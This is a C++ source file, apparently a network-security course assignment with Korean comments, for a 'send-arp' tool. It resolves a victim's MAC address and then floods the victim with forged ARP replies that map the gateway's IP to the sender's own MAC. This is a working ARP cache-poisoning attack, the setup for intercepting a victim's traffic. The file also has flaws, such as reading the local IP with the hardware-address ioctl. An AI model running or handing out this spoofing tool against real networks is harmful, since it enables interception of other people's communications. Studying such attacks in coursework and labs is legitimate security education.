#include <cstdio>
#include <pcap.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <net/if.h>
//Mac Address , IP

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> \n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

Mac MyMacAddress(struct ifreq ifr, char *dev){
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if( sock < 0){
        perror("error_socket");
        exit(1);
    }
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){
        perror("error_ioctl");
        exit(1);
    }
    close(sock);

    uint8_t mac_temp[6];
    for(int i = 0; i < 6; i ++){
        mac_temp[i] = ifr.ifr_addr.sa_data[i];
    }
    Mac my_mac_add = Mac(mac_temp);
    printf("Success! Get My Mac Address! \n");
    return my_mac_add;
    // Mac(mac_temp); 라고 하면 오류가 나는데  왜??
}

Ip MyIpAddress(struct ifreq ifr, char * dev){
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, dev);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if( sock < 0){
        perror("error_socket");
        exit(1);
    }
    if(ioctl(sock,SIOCGIFHWADDR,&ifr)<0){
        perror("error_ioctl");
        exit(1);
    }
    close(sock);

    sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    Ip my_ip_add = Ip(inet_ntoa(sin->sin_addr));
    printf("Success! Get My IP Address! \n");
    return my_ip_add;
}


Mac SenderMacAddress(char *name, Ip my_ipAdd, Mac my_macAdd, Ip sender_ipAdd){
    Mac sender_macAdd;
    //이 함수에서 원하는건 타겟의 맥 주소이다!!


    char* dev = name;
    //인터페이스를 통해 패킷 캡쳐 디스크립터를 건네받았다
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    //handle이라는 경로를 통해서 패킷을 주고 받겠다

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); //broadcast
    packet.eth_.smac_ = my_macAdd; //me
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_macAdd; //me
    packet.arp_.sip_ = htonl(my_ipAdd); //me
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); //broadcast
    packet.arp_.tip_ = htonl(sender_ipAdd); //target

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* getpacket;
        int res = pcap_next_ex(handle, &header, &getpacket);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(1);
        }

        //EthrArpPacket packet 이랑 u_char * getpacket의 형태를 맞춰서 비교해야 한다.

        //지난번 과제에서        eth_hdr = (struct libnet_ethernet_hdr *)packet;
        //                    packet += sizeof(struct libnet_ethernet_hdr);
        //이런식으로 작성한것과 유사하게

        //get_eth_hdr만큼 가져오고, sizeof(EthHdr)만큼 옮겨가서 get_arp_hdr를 해준다.
        struct EthHdr *get_eth_hdr;
        struct ArpHdr *get_arp_hdr;
        get_eth_hdr = (struct EthHdr *)getpacket;
        getpacket+= sizeof (struct EthHdr );
        get_arp_hdr = (struct ArpHdr *)getpacket;


        //해당 패킷에서 arp 인지, reply인지, IP가 맞는지 세번 확인한다.
        if(ntohs(get_eth_hdr->type_) == 0x0806 //ARP
                &&ntohs(get_arp_hdr->op_) == ArpHdr::Reply  //Reply
                && ntohl(get_arp_hdr->sip_)==sender_ipAdd){  //IP
            sender_macAdd = get_arp_hdr->smac_;
            return sender_macAdd;
        }


    }
}



int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
//------------------------------------------------------------//

	EthArpPacket packet;
    struct ifreq ifr_mac;
    struct ifreq ifr_ip;

    Ip sender_IP_Add = Ip (argv[2]);
    Ip target_IP_Add = Ip (argv[3]);

    Mac my_Mac_Add = MyMacAddress(ifr_mac, dev);
    Ip my_IP_Add = MyIpAddress(ifr_ip, dev);
    Mac sender_Mac_Add = SenderMacAddress(dev, my_IP_Add, my_Mac_Add, sender_IP_Add);

    packet.eth_.dmac_ = sender_Mac_Add; //you
    packet.eth_.smac_ = my_Mac_Add; //me
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_Mac_Add;
    packet.arp_.sip_ = htonl(Ip(target_IP_Add)); //gw
    packet.arp_.tmac_ = sender_Mac_Add; //you
    packet.arp_.tip_ = htonl(Ip(sender_IP_Add)); //you

    while(1){
        printf("ARP Reply Sending !! Modulation Success !! \n");

        //로우 패킷을 보낸다.
        //u_char *buf : 보내어진 패킷의 데이터 , int size : 버퍼 크기
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

        if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
    }
	pcap_close(handle);
}
